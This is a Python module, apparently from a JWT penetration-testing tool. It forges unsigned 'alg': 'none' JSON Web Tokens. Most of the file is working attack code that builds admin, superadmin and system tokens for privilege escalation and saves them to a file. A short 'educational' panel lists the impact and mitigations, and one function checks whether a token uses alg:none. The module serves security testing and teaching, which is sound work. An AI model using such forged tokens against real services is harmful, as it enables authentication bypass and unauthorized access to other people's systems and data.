"""
JWT alg:none Attack Module

This module provides functionality to create JWT tokens with the 'alg': 'none' 
algorithm, which bypasses signature verification in vulnerable implementations.
"""

import json
from typing import Optional, Dict, Any
from rich.console import Console
from rich.panel import Panel

from .utils import base64url_encode

console = Console()

def create_alg_none_jwt(payload: str, custom_header: Optional[Dict[str, Any]] = None) -> Optional[str]:
    """
    Create a JWT token with 'alg': 'none' (no signature).
    
    Args:
        payload: JWT payload as JSON string
        custom_header: Optional custom header dictionary
        
    Returns:
        JWT token string or None if error
    """
    try:
        # Parse payload JSON
        payload_dict = json.loads(payload)
        
        # Create header with alg: none
        header = custom_header or {}
        header['alg'] = 'none'
        if 'typ' not in header:
            header['typ'] = 'JWT'
        
        # Encode header and payload
        header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
        payload_encoded = base64url_encode(json.dumps(payload_dict, separators=(',', ':')).encode('utf-8'))
        
        # Create token with empty signature
        token = f"{header_encoded}.{payload_encoded}."
        
        console.print(f"[green]✅ alg:none JWT token created successfully![/green]")
        console.print(f"[dim]Header: {header}[/dim]")
        console.print(f"[dim]Payload: {payload_dict}[/dim]")
        
        return token
        
    except json.JSONDecodeError as e:
        console.print(f"[red]❌ Invalid JSON payload: {str(e)}[/red]")
        return None
    except Exception as e:
        console.print(f"[red]❌ Error creating alg:none JWT: {str(e)}[/red]")
        return None

def create_admin_alg_none_jwt() -> Optional[str]:
    """
    Create an admin JWT token with 'alg': 'none' for testing.
    
    Returns:
        Admin JWT token string or None if error
    """
    admin_payload = {
        "sub": "admin",
        "role": "administrator", 
        "admin": True,
        "permissions": ["read", "write", "delete", "admin"],
        "user_id": "admin",
        "username": "admin"
    }
    
    try:
        import time
        admin_payload["iat"] = int(time.time())
        
        payload_json = json.dumps(admin_payload)
        token = create_alg_none_jwt(payload_json)
        
        if token:
            console.print(f"[bold red]⚠️ Admin alg:none token created - HIGH PRIVILEGE![/bold red]")
        
        return token
        
    except Exception as e:
        console.print(f"[red]❌ Error creating admin alg:none JWT: {str(e)}[/red]")
        return None

def create_custom_alg_none_jwt(user_id: str, role: str = "user", 
                              extra_claims: Optional[Dict[str, Any]] = None) -> Optional[str]:
    """
    Create a custom JWT token with 'alg': 'none' and specified claims.
    
    Args:
        user_id: User identifier
        role: User role (default: "user")
        extra_claims: Additional claims to include
        
    Returns:
        JWT token string or None if error
    """
    try:
        import time
        
        # Create payload with common claims
        payload = {
            "sub": user_id,  # Subject
            "iat": int(time.time()),  # Issued at
            "role": role,
            "user_id": user_id
        }
        
        # Add extra claims if provided
        if extra_claims:
            payload.update(extra_claims)
        
        payload_json = json.dumps(payload)
        token = create_alg_none_jwt(payload_json)
        
        if token:
            console.print(f"[green]✅ Custom alg:none JWT created![/green]")
            console.print(f"[dim]User ID: {user_id}[/dim]")
            console.print(f"[dim]Role: {role}[/dim]")
        
        return token
        
    except Exception as e:
        console.print(f"[red]❌ Error creating custom alg:none JWT: {str(e)}[/red]")
        return None

def create_privilege_escalation_tokens() -> list[Optional[str]]:
    """
    Create a series of JWT tokens for privilege escalation testing.
    
    Returns:
        List of JWT token strings for testing
    """
    tokens = []
    
    console.print(f"[blue]🔨 Creating privilege escalation test tokens...[/blue]")
    console.print()
    
    # Standard user token
    user_payload = '{"user": "testuser", "role": "user"}'
    user_token = create_alg_none_jwt(user_payload)
    tokens.append(user_token)
    
    # Admin token
    admin_payload = '{"user": "testuser", "role": "admin", "admin": true}'
    admin_token = create_alg_none_jwt(admin_payload)
    tokens.append(admin_token)
    
    # Super admin token
    super_admin_payload = '{"user": "testuser", "role": "superadmin", "admin": true, "super_admin": true}'
    super_admin_token = create_alg_none_jwt(super_admin_payload)
    tokens.append(super_admin_token)
    
    # System token
    system_payload = '{"user": "system", "role": "system", "system": true, "permissions": ["*"]}'
    system_token = create_alg_none_jwt(system_payload)
    tokens.append(system_token)
    
    valid_tokens = sum(1 for token in tokens if token is not None)
    console.print(f"[bold green]✅ Created {valid_tokens} privilege escalation tokens[/bold green]")
    
    return tokens

def demonstrate_alg_none_vulnerability():
    """
    Demonstrate the alg:none vulnerability for educational purposes.
    """
    console.print(Panel(
        "[bold red]⚠️ alg:none Vulnerability Demo[/bold red]\n\n"
        "The 'alg': 'none' vulnerability occurs when:\n\n"
        "1. [bold]JWT library accepts 'none' algorithm[/bold]\n"
        "2. [bold]No signature verification is performed[/bold]\n"
        "3. [bold]Attacker can modify payload without detection[/bold]\n\n"
        "[bold yellow]Impact:[/bold yellow]\n"
        "• Authentication bypass\n"
        "• Privilege escalation\n"
        "• Unauthorized access\n\n"
        "[bold green]Mitigation:[/bold green]\n"
        "• Explicitly whitelist allowed algorithms\n"
        "• Never allow 'none' algorithm in production\n"
        "• Validate algorithm in token header\n\n"
        "[dim]For educational purposes only![/dim]",
        title="Educational Demo",
        border_style="red"
    ))
    
    # Demo tokens
    console.print("\n[bold blue]Demo alg:none Tokens:[/bold blue]")
    
    # Regular user
    user_token = create_alg_none_jwt('{"user": "regular", "role": "user"}')
    if user_token:
        console.print(f"[dim]Regular user: {user_token[:50]}...[/dim]")
    
    # Admin user (privilege escalation)
    admin_token = create_alg_none_jwt('{"user": "regular", "role": "admin", "admin": true}')
    if admin_token:
        console.print(f"[dim]Escalated admin: {admin_token[:50]}...[/dim]")

def save_alg_none_tokens(tokens: list[str], filepath: str) -> None:
    """
    Save alg:none JWT tokens to a file.
    
    Args:
        tokens: List of JWT token strings
        filepath: Path to save tokens
    """
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write("# alg:none JWT Tokens for Testing\n")
            f.write("# WARNING: These tokens have no signature verification!\n\n")
            
            for i, token in enumerate(tokens, 1):
                if token:
                    f.write(f"# Token {i}\n")
                    f.write(f"{token}\n\n")
        
        valid_tokens = sum(1 for token in tokens if token is not None)
        console.print(f"[green]✅ Saved {valid_tokens} alg:none tokens to: {filepath}[/green]")
        
    except Exception as e:
        console.print(f"[red]❌ Error saving tokens: {str(e)}[/red]")

def verify_alg_none_vulnerability(token: str) -> bool:
    """
    Verify if a JWT token uses the 'alg': 'none' algorithm.
    
    Args:
        token: JWT token string
        
    Returns:
        True if token uses alg:none, False otherwise
    """
    try:
        from .utils import decode_jwt_header
        
        header = decode_jwt_header(token)
        if not header:
            return False
        
        return header.get('alg') == 'none'
        
    except Exception:
        return False
